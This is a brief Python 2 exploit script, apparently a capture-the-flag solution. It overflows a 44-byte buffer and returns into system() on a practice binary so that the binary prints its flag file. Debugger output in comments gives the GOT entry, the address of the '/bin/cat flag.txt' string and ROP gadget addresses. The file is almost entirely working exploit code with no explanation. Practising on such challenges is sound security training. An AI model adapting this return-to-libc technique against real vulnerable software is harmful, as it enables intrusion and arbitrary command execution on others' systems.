# Description: :P
from struct import pack
#
# gef->  got
#
# GOT protection: Partial RelRO | GOT functions: 7
#
# ...
[0x804a018] system@GLIBC_2.0  â†’  0x8048436
# ...
#
# gef> strings
# ...
# 0x804a030: /bin/cat flag.txt
# ...
#
# gdb-peda$ ropgadget
# ret = 0x80483ca
popret = 0x80483e1 # <- This juan
# pop2ret = 0x80486ca
# pop3ret = 0x80486c9
# pop4ret = 0x80486c8
# addesp_12 = 0x80483de
# addesp_16 = 0x80484e5

rop = "\x41" * 44
rop += pack('<I',0x8048436) # System GOT
rop += pack('<I',0x41414141) # Junk
rop += pack('<I',0x804a030) # bin cat flag
print rop
